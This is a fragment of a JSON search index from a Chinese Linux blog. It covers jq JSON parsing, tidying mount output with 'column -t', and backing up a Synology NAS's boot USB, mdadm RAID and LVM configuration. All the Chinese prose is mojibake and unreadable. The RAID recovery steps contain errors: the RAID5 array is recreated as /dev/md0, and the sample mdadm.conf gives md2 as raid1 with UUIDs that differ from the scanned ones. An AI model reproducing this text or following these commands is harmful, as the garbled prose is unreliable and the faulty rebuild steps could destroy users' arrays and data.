class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.location.city\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè·å–ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.employees[0].name\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Michael\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè·å–å¯¹è±¡çš„å¤šä¸ªå­—æ®µï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.location | {street, city}\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;city\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;street\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1600 Amphitheatre Parkway\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾ˆç®€å•å§ï¼Œå’Œcurlç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥åœ¨shellè¿›è¡Œç¼–ç¨‹å¤„ç†jsonæ–‡ä»¶äº†ã€‚\u003c/p\u003e","title":"linuxä¸‹å¦‚ä½•åœ¨å‘½ä»¤è¡Œä¸‹è§£æå¤„ç†jsonæ–‡ä»¶"},{"content":"å¦‚æœå•ç‹¬æ‰§è¡Œmountå‘½ä»¤ï¼Œæ˜¾ç¤ºçš„ä¼šå¾ˆæ‚ä¹±ï¼š\nmount /dev/sda3 on / type ext4 (rw) proc on /proc type proc (rw) sysfs on /sys type sysfs (rw) devpts on /dev/pts type devpts (rw,gid=5,mode=620) tmpfs on /dev/shm type tmpfs (rw) /dev/sda1 on /boot type ext4 (rw) none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) You have mail in /var/spool/mail/root ä¹±ä½œä¸€å›¢ï¼Œé‚£ä¹ˆæ€ä¹ˆè®©è¿™äº›æ˜¾ç¤ºæ•´é½ä¸€äº›å‘¢ï¼Ÿ\nmount |column -t /dev/sda3 on / type ext4 (rw) proc on /proc type proc (rw) sysfs on /sys type sysfs (rw) devpts on /dev/pts type devpts (rw,gid=5,mode=620) tmpfs on /dev/shm type tmpfs (rw) /dev/sda1 on /boot type ext4 (rw) none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) æ•´é½å¤šäº†ï¼Œå¯¹å§ã€‚\nè®°ä½column -tè¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥å¯¹è¾“å‡ºè¿›è¡Œå¯¹é½æ“ä½œï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20240119-mount_beauty/","summary":"\u003cp\u003eå¦‚æœå•ç‹¬æ‰§è¡Œmountå‘½ä»¤ï¼Œæ˜¾ç¤ºçš„ä¼šå¾ˆæ‚ä¹±ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3 on / \u003cspan class=\"nb\"\u003etype\u003c/span\u003e ext4 \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproc on /proc \u003cspan class=\"nb\"\u003etype\u003c/span\u003e proc \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysfs on /sys \u003cspan class=\"nb\"\u003etype\u003c/span\u003e sysfs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edevpts on /dev/pts \u003cspan class=\"nb\"\u003etype\u003c/span\u003e devpts \u003cspan class=\"o\"\u003e(\u003c/span\u003erw,gid\u003cspan class=\"o\"\u003e=\u003c/span\u003e5,mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e620\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs on /dev/shm \u003cspan class=\"nb\"\u003etype\u003c/span\u003e tmpfs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1 on /boot \u003cspan class=\"nb\"\u003etype\u003c/span\u003e ext4 \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone on /proc/sys/fs/binfmt_misc \u003cspan class=\"nb\"\u003etype\u003c/span\u003e binfmt_misc \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esunrpc on /var/lib/nfs/rpc_pipefs \u003cspan class=\"nb\"\u003etype\u003c/span\u003e rpc_pipefs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eYou have mail in /var/spool/mail/root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¹±ä½œä¸€å›¢ï¼Œé‚£ä¹ˆæ€ä¹ˆè®©è¿™äº›æ˜¾ç¤ºæ•´é½ä¸€äº›å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount \u003cspan class=\"p\"\u003e|\u003c/span\u003ecolumn -t  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3  on  /                         \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  ext4         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproc       on  /proc                     \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  proc         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysfs      on  /sys                      \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  sysfs        \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edevpts     on  /dev/pts                  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  devpts       \u003cspan class=\"o\"\u003e(\u003c/span\u003erw,gid\u003cspan class=\"o\"\u003e=\u003c/span\u003e5,mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e620\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs      on  /dev/shm                  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  tmpfs        \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1  on  /boot                     \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  ext4         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone       on  /proc/sys/fs/binfmt_misc  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  binfmt_misc  \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esunrpc     on  /var/lib/nfs/rpc_pipefs   \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  rpc_pipefs   \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ•´é½å¤šäº†ï¼Œå¯¹å§ã€‚\u003c/p\u003e","title":"linuä¸‹å¦‚ä½•è®©mountæ˜¾ç¤ºçš„å¾ˆæ•´é½"},{"content":"æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ï¼ï¼ï¼\né‡è¦çš„è¯è¯´ä¸‰éï¼Œè¯è¯´è‡ªå·±ä¹°äº†ä¸ªé»‘ç¾¤æ™–ï¼Œ6ç›˜ä½çš„ï¼Œå°±æ˜¯ä¸ºäº†ä¿å­˜ç…§ç‰‡å’Œæ•°æ®\u0026hellip;\u0026hellip;\nå…¶å®1ç›˜å’Œ2ç›˜çš„naséƒ½æ˜¯è€æµæ°“ï¼Œæ ¹æœ¬æ— ç”¨ï¼Œå¿…é¡»æ˜¯4ç›˜ä½ä»¥ä¸Šçš„æ‰å‹‰å¼ºå¯é ã€‚æ‰€ä»¥æ‰ä¹°çš„è¿™ä¸ªé»‘ç¾¤æ™–ï¼Œåªä¹°äº†3ä¸ªç›˜åšäº†raid5ï¼Œä¾¥æ˜¯å¦‚æ­¤ï¼ŒçœŸçš„æ˜¯è«ååäº†ä¸€å—ï¼Œå¥½åœ¨åœ¨ä¿ä¿®æœŸå†…ï¼Œæ›´æ¢ä¸€å—åæ•…éšœè§£é™¤ï¼ŒæœŸé—´å€’è…¾2å—ç›˜çš„æ•°æ®ä¾ç„¶æ˜¯å™©æ¢¦å•Šã€‚\né‚£ä¹ˆæ•°æ®å¦‚æ­¤é‡è¦ï¼Œé‚£ä¹ˆæ€ä¹ˆåšåˆ°å®Œå…¨çš„å¤‡ä»½å‘¢ï¼Ÿ\næ•°æ®æ˜¯3ç›˜raid5ï¼Œå·²ç»æœ‰ä¿è¯äº†ï¼Œå‰©ä¸‹å°±æ˜¯ç³»ç»Ÿä¹Ÿå¿…é¡»æœ‰å¤‡ä»½å¯æ¢å¤æ‰å¯ä»¥\nç¾¤æ™–æœ¬è´¨æ˜¯linuxï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯mdadm+lvmï¼Œæ‰€ä»¥å¤‡ä»½ä¹Ÿå¿…é¡»ä»è¿™ä¸ªæ–¹å‘å¼€å§‹ã€‚\né¦–å…ˆæ˜¯å¤‡ä»½å¯åŠ¨çš„usbç›˜ï¼Œå…ˆfdisk -l çœ‹ä¸€ä¸‹ï¼š\nDisk /dev/sda: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sda1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sda2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sda3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdb: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sdb2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sdb3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdc: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdc1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sdc2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sdc3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdu: 4227 MB, 4227858432 bytes 4 heads, 32 sectors/track, 64512 cylinders Units = cylinders of 128 * 512 = 65536 bytes Device Boot Start End Blocks Id System /dev/sdu1 * 1 256 16352+ e Win95 FAT16 (LBA) 3å—2Tçš„ç›˜ï¼Œæ¯ä¸ªç›˜æœ‰3ä¸ªåˆ†åŒºï¼Œç„¶åæœ€åæ˜¯USBç›˜ï¼Œç›˜ç¬¦sduï¼Œå¤‡ä»½å®ƒ\ndd if=/dev/sdu |gzip -c \u0026gt; /root/usb.img USBç›˜å¤‡å¥½äº†ï¼Œä¸‹é¢å¾—å¤‡ä»½raidäº†ï¼Œå…ˆæŸ¥çœ‹raidä¿¡æ¯ï¼š\ncat /proc/mdstat Personalities : [linear] [raid0] [raid1] [raid10] [raid6] [raid5] [raid4] md2 : active raid5 sda3[0] sdc3[2] sdb3[1] 3897584512 blocks super 1.2 level 5, 64k chunk, algorithm 2 [3/3] [UUU] md1 : active raid1 sda2[0] sdb2[1] sdc2[2] 2097088 blocks [12/3] [UUU___] md0 : active raid1 sda1[0] sdb1[1] sdc1[2] 2490176 blocks [12/3] [UUU___] çœ‹æ¥æœ‰ä¸‰ä¸ªraidç»„ï¼Œmd0å’Œmd1æ˜¯raid1ï¼Œmd2æ˜¯raid5\nmd0çš„ç»„å‘˜æ˜¯sda1ã€sdb1ã€sdc1\nmd1çš„ç»„å‘˜æ˜¯sda2ã€sdb2ã€sdc2\nmd2çš„ç»„å‘˜æ˜¯sda3ã€sdb3ã€sdc3\nä¸‰ä¸ªç›˜çš„åˆ†åŒºåº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸ªå³å¯ï¼š\nfdisk -l /dev/sda Disk /dev/sda: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sda1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sda2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sda3 588 243201 1948793440+ fd Linux raid autodetect æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯2Tçš„ç›˜ï¼Œä¸‰ä¸ªåˆ†åŒºçš„èµ·å§‹æŸ±å¤´ä¿¡æ¯éƒ½å¾ˆæ¸…æ™°ï¼Œè®°å½•ä¸‹æ¥ã€‚\næ‰€ä»¥ï¼Œå¦‚æœåäº†ï¼Œçœ‹çœ‹åˆ†åŒºï¼Œåˆ†åŒºæ²¡åç›´æ¥è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œåˆ†åŒºåäº†çš„è¯ï¼Œæˆ‘ä»¬å…ˆfdiskåˆ†å¥½åŒºï¼Œç„¶åå¼€å§‹ä¿®å¤ï¼š\næŸ¥çœ‹å„ä¸ªmdçš„uuidï¼š\nmdadm --examine --scan /dev/sda1 /dev/sdb1 /dev/sdc1 ARRAY /dev/md0 UUID=35d393bd:1f4dde6b:3017a5a8:c86610be mdadm --examine --scan /dev/sda2 /dev/sdb2 /dev/sdc2 ARRAY /dev/md1 UUID=8f02f0d4:e249900a:3017a5a8:c86610be mdadm --examine --scan /dev/sda3 /dev/sdb3 /dev/sdc3 ARRAY /dev/md/2 metadata=1.2 UUID=d1411045:24723563:3a19cef5:07732afa name=DiskStation:2 ä¿®å¤çš„æ—¶å€™ï¼Œæ ¹æ®ä¸Šé¢ä¿¡æ¯ï¼Œç¼–è¾‘ç”Ÿæˆ/etc/mdadm.confï¼Œæ³¨æ„é¡ºåºæ˜¯å€’çš„ï¼Œ md0-\u0026gt;md1-\u0026gt;md2ï¼Œdevicesä¸­å¦‚æœä¸€å—ç›˜åäº†ï¼Œæ”¹æˆmissing\u0026hellip;\u0026hellip;\nDEVICE partitions ARRAY /dev/md0 level=raid1 num-devices=2 â†ªUUID=b3cd99e7:d02be486:b0ea429a:e18ccf65 â†ªdevices=/dev/sda1,missing ARRAY /dev/md1 level=raid1 num-devices=2 â†ªUUID=75fa22aa:9a11bcad:b42ed14a:b5f8da3c â†ªdevices=/dev/sda2,missing ARRAY /dev/md2 level=raid1 num-devices=2 â†ªUUID=532502de:90e44fb0:242f485f:f02a2565 â†ªdevices=/dev/sda3,missing ç„¶ååˆ·æ–°raidå¹¶æŸ¥çœ‹raidæ˜¯å¦æ­£å¸¸\nmdadm -A -s cat /proc/mdstat å¦‚æœè¦å…¨é¢æ¯äº†ç›˜é˜µï¼Œé‡å»ºmdï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nmdadm --create --verbose /dev/md0 --level=1 --raid-devices=3 /dev/sda1 /dev/sdb1 /dev/sdc1 mdadm --create --verbose /dev/md1 --level=1 --raid-devices=3 /dev/sda2 /dev/sdb2 /dev/sdc2 mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sda3 /dev/sdb3 /dev/sdc3 ä¸Šé¢å·²ç»åšå¥½äº†RAIDéƒ¨åˆ†MDçš„å¤‡ä»½ã€‚LVMæ˜¯åŸºäºMDä¹‹ä¸Šçš„ï¼Œä¸‹é¢æˆ‘ä»¬æ¥å¤‡ä»½LVMã€‚\né¦–å…ˆæŸ¥çœ‹å·ä¿¡æ¯ï¼š\nDiskStation\u0026gt; pvdisplay --- Physical volume --- PV Name /dev/md2 VG Name vg1 PV Size 3.63 TB / not usable 2.88 MB Allocatable yes (but full) PE Size (KByte) 4096 Total PE 951558 Free PE 0 Allocated PE 951558 PV UUID 5li2xk-tZdQ-c63W-qpM7-jo9F-5xGg-xFP1Wr DiskStation\u0026gt; vgdisplay --- Volume group --- VG Name vg1 System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 1 Max PV 0 Cur PV 1 Act PV 1 VG Size 3.63 TB PE Size 4.00 MB Total PE 951558 Alloc PE / Size 951558 / 3.63 TB Free PE / Size 0 / 0 VG UUID UUCftW-HIFK-vmL0-0MTG-XzOT-BCTI-okhVf3 DiskStation\u0026gt; lvdisplay --- Logical volume --- LV Name /dev/vg1/syno_vg_reserved_area VG Name vg1 LV UUID BmrrfE-vjMY-rJO8-C7OP-2los-KfeO-1hBrWb LV Write Access read/write LV Status available # open 0 LV Size 12.00 MB Current LE 3 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 384 Block device 253:0 --- Logical volume --- LV Name /dev/vg1/volume_1 VG Name vg1 LV UUID 80vCET-1yH4-KMXS-E0N7-3tiP-m24I-Gzw7ij LV Write Access read/write LV Status available # open 1 LV Size 3.63 TB Current LE 951555 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 4096 Block device 253:1 ok, å¤‡ä»½\nvgcfgbackup å¤‡ä»½æ–‡ä»¶ä¼šæ”¾åˆ°/etc/lvm/backup/vg1ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶æ‹·èµ°.\nå¦‚æœè¦æ¢å¤ï¼š\nvgcfgrestore -f vg1 vg1 pvscan vgscan lvscan æŠŠuç›˜æ–‡ä»¶ã€fdiskæ–‡ä»¶ã€lvmçš„æ–‡ä»¶æ‹·å‡ºæ¥æ”¾åˆ°dropboxï¼Œä¸€åˆ‡å°±å¦¥å½“äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240119-qunhui_backup/","summary":"\u003cp\u003eæ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eé‡è¦çš„è¯è¯´ä¸‰éï¼Œè¯è¯´è‡ªå·±ä¹°äº†ä¸ªé»‘ç¾¤æ™–ï¼Œ6ç›˜ä½çš„ï¼Œå°±æ˜¯ä¸ºäº†ä¿å­˜ç…§ç‰‡å’Œæ•°æ®\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003eå…¶å®1ç›˜å’Œ2ç›˜çš„naséƒ½æ˜¯è€æµæ°“ï¼Œæ ¹æœ¬æ— ç”¨ï¼Œå¿…é¡»æ˜¯4ç›˜ä½ä»¥ä¸Šçš„æ‰å‹‰å¼ºå¯é ã€‚æ‰€ä»¥æ‰ä¹°çš„è¿™ä¸ªé»‘ç¾¤æ™–ï¼Œåªä¹°äº†3ä¸ªç›˜åšäº†raid5ï¼Œä¾¥æ˜¯å¦‚æ­¤ï¼ŒçœŸçš„æ˜¯è«ååäº†ä¸€å—ï¼Œå¥½åœ¨åœ¨ä¿ä¿®æœŸå†…ï¼Œæ›´æ¢ä¸€å—åæ•…éšœè§£é™¤ï¼ŒæœŸé—´å€’è…¾2å—ç›˜çš„æ•°æ®ä¾ç„¶æ˜¯å™©æ¢¦å•Šã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ•°æ®å¦‚æ­¤é‡è¦ï¼Œé‚£ä¹ˆæ€ä¹ˆåšåˆ°å®Œå…¨çš„å¤‡ä»½å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ•°æ®æ˜¯3ç›˜raid5ï¼Œå·²ç»æœ‰ä¿è¯äº†ï¼Œå‰©ä¸‹å°±æ˜¯ç³»ç»Ÿä¹Ÿå¿…é¡»æœ‰å¤‡ä»½å¯æ¢å¤æ‰å¯ä»¥\u003c/p\u003e\n\u003cp\u003eç¾¤æ™–æœ¬è´¨æ˜¯linuxï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯mdadm+lvmï¼Œæ‰€ä»¥å¤‡ä»½ä¹Ÿå¿…é¡»ä»è¿™ä¸ªæ–¹å‘å¼€å§‹ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯å¤‡ä»½å¯åŠ¨çš„usbç›˜ï¼Œå…ˆfdisk -l çœ‹ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sda: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdb: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  